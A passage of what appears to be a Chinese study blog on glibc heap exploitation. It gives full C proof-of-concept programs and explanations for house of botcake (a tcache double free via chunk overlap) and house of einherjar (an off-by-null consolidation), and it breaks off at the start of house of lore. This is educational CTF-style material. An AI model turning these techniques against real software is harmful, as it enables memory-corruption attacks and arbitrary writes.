<h3 id="相关技巧-3"><a href="#相关技巧-3" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-3"><a href="#利用效果-3" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址写入一个堆地址，任意地址分配</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>效果：任意地址分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * 就是2.29新引入的key机制，检查tcache_double</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个<strong>double free</strong></p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们<strong>通过覆写b来将我们a的fwd指针指向栈上</strong></p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>double free</p>
<h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
<li>多次释放 <code>chunk</code> 的能力</li>
</ul>
<h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以用于绕过 <code>tcache-&gt;key</code> 的检查，利用过程如下：</p>
<ul>
<li>申请 <code>7</code> 个大小相同，大小大于 <code>0x80</code> 的 <code>chunk</code>，再申请三个，分别为 <code>chunk A</code> 和 <code>chunkB</code> 和 <code>chunk C</code></li>
<li>释放前 <code>7</code> 个和 <code>chunk A</code>，前面 <code>7</code> 个都会进入到 <code>tcachebin</code> 里面，<code>chunk A</code> 进入到 <code>unsortedbin</code></li>
<li>释放 <code>chunk B</code>，则 <code>chunk B</code> 会和 <code>chunk A</code> 合并</li>
<li>从 <code>tcachebin</code> 分配走一个</li>
<li>再次释放 <code>chunk B</code>，此时 <code>B</code> 同时存在与 <code>unsortedbin</code> 和 <code>tcachebin</code></li>
</ul>
<h3 id="相关技巧-4"><a href="#相关技巧-4" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>在高版本需要绕过指针保护的检查</li>
</ul>
<h3 id="利用效果-4"><a href="#利用效果-4" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造出堆重叠，为后续利用做准备</li>
</ul>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>效果：任意地址分配</p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/#_1">ctf-wiki</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar, made by Huascar Tejeda - @htejeda, works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="type">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="type">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *b = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *c = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">    <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="type">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出写、<code>off by one</code>、<code>off by null</code></p>
<h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可分配大于处于 <code>unsortedbin</code> 的 <code>chunk</code></li>
</ul>
<h3 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用 <code>off by null</code> 修改掉 <code>chunk</code> 的 <code>size</code> 域的 <code>P</code> 位，绕过 <code>unlink</code> 检查，在堆的后向合并过程中构造出 <code>chunk overlapping</code>。</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code>，<code>chunk D</code> 用来做 <code>gap</code>，<code>chunk A、chunk C</code> 都要处于 <code>unsortedbin</code> 范围</li>
<li>释放 <code>A</code>，进入 <code>unsortedbin</code></li>
<li>对 <code>B</code> 写操作的时候存在 <code>off by null</code>，修改了 <code>C</code> 的 <code>P</code> 位</li>
<li>释放 <code>C</code> 的时候，堆后向合并，直接把 <code>A、B、C</code> 三块内存合并为了一个 <code>chunk</code>，并放到了 <code>unsortedbin</code> 里面</li>
<li>读写合并后的大 <code>chunk</code> 可以操作 <code>chunk B</code> 的内容，<code>chunk B</code> 的头</li>
</ul>
<h3 id="相关技巧-5"><a href="#相关技巧-5" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>虽然该利用技巧至今仍可以利用，但是需要对 <code>unlink</code> 绕过的条件随着版本的增加有所变化。</p>
<p>最开始的 <code>unlink</code> 的代码是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">		<span class="comment">// .....							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;									      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>只需要绕过<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> 即可，因此，不需要伪造地址处于高位的 <code>chunk</code> 的 <code>presize</code> 域。</p>
<p>高版本的 <code>unlink</code> 的条件是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新增了 <code>chunksize (p) != prev_size (next_chunk (p))</code>，对 <code>chunksize</code> 有了检查，伪造的时候需要绕过。</p>
<h3 id="利用效果-5"><a href="#利用效果-5" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造 <code>chunk overlap</code> 后，可以任意地址分配</li>
<li>结合其他方法进行任意地址读写</li>
</ul>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span 